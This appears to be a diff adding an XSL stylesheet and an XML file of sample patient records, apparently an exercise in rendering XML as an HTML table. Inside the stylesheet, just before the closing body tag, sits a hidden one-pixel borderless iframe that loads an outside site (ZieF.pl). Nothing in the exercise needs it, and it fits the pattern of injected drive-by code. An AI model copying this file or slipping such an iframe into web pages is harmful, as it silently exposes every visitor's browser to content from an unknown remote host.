@@ -1,0 +1,55 @@
+//xsl
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<html>
+<body>
+<h1>Patients Information</h1>
+<table border="1">
+<tr bgcolor="#9acd32">
+<th>ssn</th>
+<th>name</th>
+<th>age</th>
+<th>room-no</th>
+</tr>
+<tr>
+<td><xsl:value-of select="/Patients/Patient/ssn"/></td>
+<td><xsl:value-of select="/Patients/Patient/name"/></td>
+<td><xsl:value-of select="/Patients/Patient/age"/></td>
+<td><xsl:value-of select="/Patients/Patient/room-no"/></td>
+</tr>
+</table>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
+</xsl:template>
+</xsl:stylesheet>
+
+//xml
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet href="xml7.xsl" type="text/xsl" ?>
+<Patients>
+<Patient>
+<name>
+<fname>Roy</fname>
+<mname>B</mname>
+<lname>Mathew</lname>
+</name>
+<ssn>SSN8055</ssn>
+<age>22</age>
+<room-no>28</room-no>
+<insurance type="primary">
+<id>45422</id>
+<gn>454</gn>
+<address>#S-28, Basaveshwarnagar Blore-79</address>
+</insurance>
+<insurance type="secondary">
+<id>45423</id>
+<gn>454</gn>
+<address>#S-30, Ganesha Temple Blore-79</address>
+</insurance>
+<med-problem>High B.P</med-problem>
+<drug-allergie>Nil</drug-allergie>
+</Patient>
+</Patients>
